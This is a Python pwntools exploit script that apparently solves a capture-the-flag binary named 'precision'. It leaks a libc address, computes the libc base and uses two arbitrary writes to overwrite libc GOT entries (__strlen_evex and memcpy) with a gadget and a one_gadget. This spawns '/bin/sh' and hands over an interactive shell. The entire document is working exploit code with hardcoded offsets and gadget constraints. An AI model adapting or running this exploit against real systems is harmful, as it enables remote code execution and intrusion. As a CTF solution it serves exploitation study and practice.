#!/usr/bin/env python3

from pwn import *

elf = ELF("./precision")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

gs = '''
b main
continue
'''

def start():
    if args.REMOTE:
        return remote("127.0.0.1", 9004)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
#leak
leak = int(rcu(b":", "\n"),16)
libc.address = leak - libc.sym._IO_2_1_stdout_
logleak("stdout", leak)
logbase()

__strlen_evex = libc.address+0x219098
logleak("__strlen_evex",__strlen_evex)

#1st write a __strlen_evex GOT (perror => perror_internal =⇒ strerror_r ==> dcgettext => __dcigettext__strlen_evex)
sla(b">>", bc(__strlen_evex)) #__strlen_evex GOT
#gadget to met the onegadget constrains: r12  NULL => memcpy
#.text:0000000000088630 mov     rdx, r12
#.text:0000000000088633 call    j___mempcpy_ifun
payload = p64(libc.address+0x88630) # mov     rdx, r12;call    j___mempcpy_ifun
sa(b":", (payload))

#2nd overwrite memcpy GOT with a one_gadget (r12 && rsi == NULL)
#one_gadget
#0xebcf8 execve("/bin/sh", rsi, rdx)
#$constraints:
#$  address rbp-0x78 is writable
#$  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#$  [rdx] == NULL || rdx == NULL || rdx is a valid envp

j___mempcpy_ifun = libc.address + 0x219040 #memcpy got
sla(b">>", bc(j___mempcpy_ifun))

#one_gadget
#0xebcf8 execve("/bin/sh", rsi, rdx)
#$constraints:
#$  address rbp-0x78 is writable
#$  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#$  [rdx] == NULL || rdx == NULL || rdx is a valid envp
payload = p64(libc.address+0xebcf8) #one gadget (contrains rsi, rdx = NULL)
sa(b":", payload)

#========= interactive ====================
r.interactive()